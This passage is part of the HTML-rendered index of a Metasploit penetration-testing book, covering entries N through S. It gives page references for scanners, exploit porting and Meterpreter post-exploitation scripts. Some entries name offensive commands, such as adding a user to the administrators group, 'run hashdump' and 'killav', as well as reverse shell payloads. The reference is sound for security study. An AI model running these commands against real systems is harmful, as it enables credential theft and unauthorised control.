13–14</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">nasm_shell.rb <span class="s42">utility, 13</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">NAT (Network Address Translation), 25 Nessus, 44–51</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Add button, 45, 47</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">Bridge plug-in, 49–50</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">Browse button, 47</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">configuring, 44–45 creating scan policy, 45–47</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">Discovered Assets section, 40 General settings, 46</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Home Feed, 44</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">importing report from, 48–49 Launch Scan button, 47 <span class="s56">nessus_connect </span>command, 50</p><p class="s41" style="padding-left: 101pt;text-indent: 0pt;line-height: 11pt;text-align: left;">.nessus <span class="s42">file format, 48</span></p><p class="s56" style="padding-left: 101pt;text-indent: 0pt;line-height: 11pt;text-align: left;">nessus_help <span class="s42">command, 49</span></p><p class="s56" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">nessus_report_get <span class="s42">command, 50</span></p><p class="s56" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">nessus_report_list <span class="s42">command, 50</span></p><p class="s56" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">nessus_scan_new <span class="s42">command, 50</span></p><p class="s56" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">nessus_scan_status <span class="s42">command, 50</span></p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">Nessus window, 44–45</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">Plugins page, 46</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">Policies tab, 45</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">Preferences page, 47</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">reports in, 47–48</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">running scan, 47</p><p class="s42" style="padding-left: 122pt;text-indent: -21pt;text-align: left;">scanning from within Metasploit, 49–51</p><p class="s42" style="padding-top: 3pt;padding-left: 27pt;text-indent: 0pt;text-align: left;">Scans tab, 45, 47</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">Submit button, 47, 48</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">Users tab, 45</p><p class="s41" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">netcat <span class="s42">listener, 32, 36</span></p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">Netcraft, passive information gathering using, 17</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Netgear switch, 30</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">net localgroup administrators metasploit</p><p class="s56" style="padding-left: 16pt;text-indent: 32pt;text-align: left;">/ADD <span class="s42">command, 187 </span>netstat -an <span class="s42">command, 114 </span>net user <span class="s42">command, 85 NetWin SurgeMail 3.8k4-4</span></p><p class="s42" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">vulnerability, 197</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">Network Address Translation (NAT), 25 Network Connections Control Panel,</p><p class="s42" style="padding-left: 16pt;text-indent: 32pt;text-align: left;">Windows XP, 269 Network Service account, 271</p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">New Database option, SQL Server Man- agement Studio Express, 272</p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">New Login option, User Properties window, 272</p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">New Table option, SQL Server Manage- ment Studio Express, 272</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">NeXpose, 37–44</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">Administration tab, 37</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">Assets tab, 37</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">configuring, 37–42</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">Community edition, 37</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">Credentials tab, 38</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">Devices tab, 38</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">Home tab, 39</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">importing report from, 42–43 NeXpose Simple XML Export</p><p class="s42" style="padding-left: 29pt;text-indent: 0pt;line-height: 10pt;text-align: center;">option, 41</p><p class="s42" style="padding-left: 31pt;text-indent: 0pt;text-align: center;">New Login button, 38</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">New Manual Scan button, 39 New Report button, 41</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">New Site button, 38 New Site wizard, 39</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">Report Configuration wizard, 42 Report format field, 41</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">running within <span class="s41">msfconsole</span>, 43–44 Scan Progress section, 40</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">Scan Setup tab, 38 Select Devices dialog, 42 Select Sites button, 41</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">Start New Scan dialog, 39 Start Now button, 39 Test Login button, 38 Vulnerabilities tab, 37</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">nexpose_connect -h <span class="s42">command, 43</span></p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">nexpose_scan<span class="s42">, 43</span></p><p class="s42" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Next SEH (NSEH), 204, 208–209, 229</p><p class="s41" style="text-indent: 0pt;line-height: 11pt;text-align: right;">nmap<span class="s42">, 168, 257–259</span></p><p class="s42" style="text-indent: 0pt;line-height: 11pt;text-align: right;">idle scan, 22, 23</p><p class="s42" style="padding-left: 122pt;text-indent: -21pt;text-align: left;">importing results into Metasploit, 21–22</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;line-height: 11pt;text-align: left;"><span class="s56">-Pn </span>flag, <span class="s41">nmap</span>, 19</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">port scanning with, 18–20, 76 running from <span class="s41">msfconsole</span>, 24–25 scan, 252</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">script options, 64–65 TCP idle scan, 22–23</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">No Execute (NX), 67 noncredentialed scan, 43</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">NOP (no-operation instruction), 111, 204, 209, 216, 219</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Notepad, 239–240</p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">notepad.exe<span class="s42">, 156</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">NSEH (Next SEH), 204, 208–209, 229</p><p class="s56" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">nslookup<span class="s42">, passive information gathering using, 18</span></p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">NT AUTHORITY\SYSTEM server user- name, 86</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">NTLM (NT LAN Manager), 82, 83</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">NTLMv2 (NT LAN Manager v2), 82 NX (No Execute), 67</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">O</p><p class="s56" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Offset <span class="s42">value, 223</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">oledlg.dll <span class="s42">file, 230</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">opcodes, 13</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Open option, Immunity Debugger, 113 open source intelligence (OSINT), 16 OpenSSH, 28, 259</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Open Table option, SQL Server Man- agement Studio Express, 272</p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">open_x11 <span class="s42">scanner, 54–55</span></p><p class="s41" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">opt/framework3/msf3/lib/rex/post/ meterpreter/ui/console/ command_dispatcher/ <span class="s42">directory, 242</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">OSINT (open source intelligence), 16 OS X system</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">dumping hashes on, 283 VMware Player, 268</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">overt penetration testing, 4, 5 overwrite exploits, for SEH, 226–232</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">P</p><p class="s42" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">packers, 107–108</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">packetrecorder <span class="s42">command, 93 passing password hashes, 84–85</span></p><p class="s42" style="padding-top: 3pt;padding-left: 30pt;text-indent: -10pt;text-align: left;">passive information gathering, 16–18 using Netcraft, 17</p><p class="s42" style="padding-left: 30pt;text-indent: 0pt;line-height: 11pt;text-align: left;">using <span class="s56">nslookup</span>, 18</p><p class="s41" style="padding-left: 30pt;text-indent: 0pt;line-height: 11pt;text-align: left;">whois <span class="s42">lookups, 16–17</span></p><p class="s42" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">pass-the-hash technique, 84 passwords</p><p class="s42" style="padding-left: 30pt;text-indent: 0pt;line-height: 10pt;text-align: left;">harvesting, 148–150</p><p class="s42" style="padding-left: 30pt;text-indent: 0pt;text-align: left;">hashes for, 82–84</p><p class="s42" style="padding-left: 41pt;text-indent: 0pt;text-align: left;">dumping, 83–84</p><p class="s42" style="padding-left: 41pt;text-indent: 0pt;text-align: left;">extracting, 82–83</p><p class="s42" style="padding-left: 41pt;text-indent: 0pt;text-align: left;">passing, 84–85</p><p class="s41" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">pattern_offset.rb <span class="s42">file, 203</span></p><p class="s56" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">pay = client.framework.payloads</p><p class="s56" style="padding-left: 52pt;text-indent: 0pt;text-align: left;">.create(payload) <span class="s42">function, 239</span></p><p class="s42" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">payload, 8, 75</p><p class="s56" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">payload.encoded <span class="s42">function, 224</span></p><p class="s41" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">payload.exe <span class="s42">file, 85, 86</span></p><p class="s41" style="padding-left: 19pt;text-indent: 0pt;line-height: 11pt;text-align: left;">.pcap <span class="s42">file format, 93</span></p><p class="s41" style="padding-left: 19pt;text-indent: 0pt;line-height: 11pt;text-align: left;">.pde <span class="s42">file, 159</span></p><p class="s42" style="padding-left: 52pt;text-indent: -32pt;text-align: left;">PDF file format bug, spear-phishing attack vector, 137</p><p class="s42" style="padding-left: 19pt;text-indent: 0pt;text-align: center;">PE (Portable Executable) format, 100 penetration testing, 4–5. <span class="s41">See also </span>simu- lated penetration test</p><p class="s42" style="padding-left: 52pt;text-indent: -32pt;text-align: left;">Penetration Testing Execution Stan- dard (PTES), phases of, 2–4</p><p class="s42" style="padding-left: 30pt;text-indent: 0pt;text-align: left;">exploitation, 3</p><p class="s42" style="padding-left: 30pt;text-indent: 0pt;text-align: left;">intelligence gathering, 2</p><p class="s42" style="padding-left: 30pt;text-indent: 0pt;text-align: left;">post exploitation, 3–4</p><p class="s42" style="padding-left: 30pt;text-indent: 0pt;text-align: left;">pre-engagement interactions, 2</p><p class="s42" style="padding-left: 30pt;text-indent: 0pt;text-align: left;">reporting, 4</p><p class="s42" style="padding-left: 30pt;text-indent: 0pt;text-align: left;">threat modeling, 2–3</p><p class="s42" style="padding-left: 30pt;text-indent: 0pt;text-align: left;">vulnerability analysis, 3</p><p class="s41" style="padding-left: 19pt;text-indent: 0pt;line-height: 11pt;text-align: left;">pentest/exploits/fasttrack/ <span class="s42">directory, 274</span></p><p class="s41" style="padding-left: 19pt;text-indent: 0pt;line-height: 11pt;text-align: left;">pentest/exploits/set/ <span class="s42">directory, 136, 274</span></p><p class="s42" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Perez, Carlos, 235</p><p class="s56" style="padding-left: 52pt;text-indent: -32pt;text-align: left;">Perform a Mass Email Attack <span class="s42">option, SET main menu, 139</span></p><p class="s56" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">persistence <span class="s42">command, 94–95 PID (process ID), 236</span></p><p class="s42" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">PID variable, 238</p><p class="s56" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">ping <span class="s42">command, 19 pivoting</span></p><p class="s42" style="padding-left: 30pt;text-indent: 0pt;text-align: left;">with Meterpreter, 89–91</p><p class="s42" style="padding-left: 30pt;text-indent: 0pt;text-align: left;">process of, 25</p><p class="s42" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">polymorphic encoding, 103</p><p class="s42" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">PolyPack project, 108</p><p class="s42" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">POP3 service, 181</p><p class="s41" style="padding-left: 52pt;text-indent: -32pt;text-align: left;">POP-POP-RETN <span class="s42">sequence of instruc- tions, 204, 206, 208, 226,</span></p><p class="s42" style="padding-left: 52pt;text-indent: 0pt;text-align: left;">229, 230</p><p class="s42" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Portable Executable (PE) format, 100</p><p class="s42" style="padding-top: 3pt;padding-left: 101pt;text-indent: -10pt;text-align: left;">porting exploits to Metasploit, 215–233 assembly languages, 216</p><p class="s42" style="padding-left: 112pt;text-indent: -10pt;text-align: left;">buffer overflow exploits, 216–226 adding randomization, 222–223</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">completed module, 224–226 configuring exploit definition,</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;line-height: 10pt;text-align: left;">219–220</p><p class="s42" style="padding-left: 122pt;text-indent: -10pt;text-align: left;">implementing features of the Framework, 221–222</p><p class="s42" style="padding-left: 122pt;text-indent: -10pt;text-align: left;">removing dummy shellcode, 223–224</p><p class="s42" style="padding-left: 112pt;text-indent: 0pt;text-align: left;">removing NOP Slide, 223 stripping existing exploit, 218–219 testing base exploit, 220–221</p><p class="s42" style="padding-left: 90pt;text-indent: 10pt;text-align: left;">SEH overwrite exploit, 226–232 port scanning with <span class="s41">nmap</span>, 18–20, 76 <span class="s41">portscan syn </span>module, 26</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">post exploitation</p><p class="s42" style="padding-left: 101pt;text-indent: 0pt;text-align: left;">modules for Meterpreter, 95 phase of PTES, 3–4</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Postfix mail server, 260 PostgreSQL database, 20</p><p class="s41" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">postgres <span class="s42">username, in PostgreSQL database, 20</span></p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">POST parameter attack, Microsoft SQL injection, 166–167</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">POST parameters, 148</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">PowerShell, 185, 189–190, 192–194</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">powershell_upload_exec <span class="s42">function, 191</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">pre-engagement interactions, 2</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">print_error() <span class="s42">function, 242</span></p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">printing output, for Meterpreter scripts, 241–242</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">print_line() <span class="s42">function, 241</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">print_status() <span class="s42">function, 241</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">priv <span class="s42">extensions, 86</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">privilege escalation, 85–87, 119</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">privilege-escalation attack, 110</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">PRNG exploit, 262</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Process Explorer, Windows, 105 process ID (PID), 236</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">ProFTPD 1.3.1, 259</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">protection mechanisms, 283 Protocols for SQLEXPRESS option,</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">SQL Server Configuration Manager window, 270</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">Protocol tab, SQL Server Configuration Manager window, 270</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">ps <span class="s42">command, 81–82, 87–89, 180, 278 PTES (Penetration Testing Execution</span></p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">Standard). <span class="s41">See </span>Penetration Test- ing Execution Standard (PTES)</p><p class="s42" style="padding-top: 3pt;padding-left: 16pt;text-indent: 0pt;text-align: left;">PureBasic language, 54</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">PUT <span class="s42">method, HTTP, 261, 264</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">PuTTY Windows SSH client, 106</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">Q</p><p class="s42" style="padding-top: 4pt;padding-left: 49pt;text-indent: -32pt;text-align: left;">query string attack, Microsoft SQL injection, 165–166</p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">Query String Parameter Attack option, 165</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">Quick TFTP Pro 2.1, 226</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">R</p><p class="s42" style="padding-top: 4pt;padding-left: 49pt;text-indent: -32pt;text-align: left;">Railgun add-on, manipulating Windows APIs with, 97</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">rainbow table attack, 84 random characters, 229, 230 random dynamic port, TCP, 27 random payload name, 193</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">rand_text_alpha_upper <span class="s42">buffer, 223</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">Rapid7, 37</p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">RATTE (Remote Administration Tool Tommy Edition), 160</p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">raw hexadecimal format, convert executable to, 192</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">RDP (Remote Desktop Protocol), 257 read-only (RO) community string, 30 read/write (RW) community string, 30 <span class="s56">reboot </span>command, 279</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">reg <span class="s58">command </span><span class="s42">command, 278</span></p><p class="s41" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">regedit<span class="s42">, 95</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">registry keys, 95</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">registry manipulation, 243</p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">Remote Administration Tool Tommy Edition (RATTE), 160</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">Remote Desktop Protocol (RDP), 257 remote GUI (VNC), getting, 283 Remote Procedure Call (RPC)</p><p class="s42" style="padding-left: 16pt;text-indent: 32pt;text-align: left;">service, 59 reporting phase of PTES, 4 Reports tab</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">Nessus, 45, 48</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">NeXpose home page, 37, 40, 42</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">Required column, 51</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">resource <span class="s42">command, 72</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">resource files, for exploitation, 72–73 <span class="s56">resource karma.rc </span>command, 180 <span class="s41">resource.rc </span>file, 72</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;line-height: 10pt;text-align: left;">restrictions for SEH, 204–206</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">rev2self <span class="s42">command, 87, 278</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">reverse Meterpreter payload, 145, 155</p><p class="s42" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">reverse payload, 62</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">reverse shell, 8</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">reverse_tcp <span class="s42">payload, 61, 67, 68</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Rex::Text.pattern_create<span class="s42">, 202</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Rex::Text.rand_text_alpha <span class="s42">function, 245</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">RHOST <span class="s42">option, 10, 276</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">RHOSTS <span class="s42">option, 22–23, 25, 67, 91, 125, 126</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">RO (read-only) community string, 30</p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">robots.txt <span class="s42">file, 127</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root/.msf3/config <span class="s42">directory, 64</span></p><p class="s41" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">root/.msf3/modules/exploits/windows/ imap/ <span class="s42">directory, 204</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root/.msf3/modules/auxiliary/fuzzers/</p><p class="s42" style="padding-left: 90pt;text-indent: 32pt;text-align: left;">directory, 198 <span class="s56">route add </span>command, 91 <span class="s56">route </span>command, 90</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">route print <span class="s42">command, 90 RPC (Remote Procedure Call)</span></p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">service, 59</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">RPORT <span class="s42">option, 10</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">RSA company, 110</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">RT73 chipset, 179</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Ruby programming language, 185 Ruby shell, 97</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">rules for Meterpreter scripts, 244</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">run_batch(batch) <span class="s42">method, 31</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">run <span class="s42">command, 130, 235, 249</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">run get_local_subnets <span class="s42">command, 89 </span>run hashdump <span class="s42">command, 93 </span>run_host(ip) <span class="s42">method, 31</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">run migrate <span class="s42">script, 117 </span>run_range(range) <span class="s42">method, 31 </span>run screen_unlock <span class="s42">command, 92</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">run scriptname <span class="s42">command, 92, 277</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">run vnc <span class="s42">command, 92</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">RW (read/write) community string, 30</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">S</p><p class="s42" style="padding-top: 3pt;padding-left: 122pt;text-indent: -32pt;text-align: left;">sa (system administrator) account, 77, 79, 168, 186</p><p class="s42" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">SAM (Security Account Manager) data- base, 83, 282</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Samba exploit, 69, 90</p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">save <span class="s42">command, 64</span></p><p class="s41" style="padding-left: 122pt;text-indent: -32pt;text-align: left;">scanner/ftp/ anonymous <span class="s42">module, anony- mous logins, 29</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">scanner/http <span class="s42">modules, 126</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">scanner/ip/ipidseq <span class="s42">module, 22</span></p><p class="s56" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">scanner <span class="s42">mixin, 31</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">scanner/portscan/syn <span class="s42">module, 257</span></p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">scanner/portscan/tcp <span class="s42">module, 91, 257</span></p><p class="s41" style="padding-top: 3pt;padding-left: 17pt;text-indent: 0pt;text-align: left;">scanner/snmp/snmp_enum <span class="s42">module, 30 scanning</span></p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">Metasploitable system, 258–259 a number of systems, 27</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;line-height: 10pt;text-align: left;">only one system, 27</p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">scan policies, list of available, 50</p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">scraper <span class="s42">command, 93–94</span></p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">screenshot <span class="s42">command, 80–81, 278</span></p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">scripts, for Meterpreter, 92–95, 235–250</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">API for, 241–244</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">creating, 244–250</p><p class="s56" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">hashdump<span class="s42">, 93</span></p><p class="s56" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">killav<span class="s42">, 93</span></p><p class="s56" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">migrate<span class="s42">, 92–93</span></p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">overview, 235–241</p><p class="s56" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">packetrecorder<span class="s42">, 93</span></p><p class="s56" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">persistence<span class="s42">, 94–95</span></p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">rules for, 244</p><p class="s56" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">scraper<span class="s42">, 93–94</span></p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">--script=smb-check-vulns <span class="s42">plug-in, 65</span></p><p class="s42" style="padding-left: 17pt;text-indent: 0pt;text-align: justify;"><span class="s41">scripts/meterpreter/ </span>directory, 89, 235, 244 Search button, Login-New window, 272 <span class="s56">search </span>command, 58, 60</p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: justify;">search <span class="s58">name </span><span class="s42">command, 275</span></p><p class="s56" style="padding-left: 17pt;text-indent: 0pt;text-align: left;">search scanner/http <span class="s42">command, 126 Secure Shell (SSH), 28, 259 Secure Sockets Layer (SSL), 31</span></p><p class="s42" style="padding-left: 49pt;text-indent: -32pt;text-align: left;">Security Account Manager (SAM) data- base, 83, 282</p><p class="s42" style="padding-left: 27pt;text-indent: -10pt;text-align: left;">SEH (Structured Exception Handler) controlling, 201–203</p><p class="s42" style="padding-left: 49pt;text-indent: -21pt;text-align: left;">overwrite exploits for, porting to Metasploit, 226–232</p><p 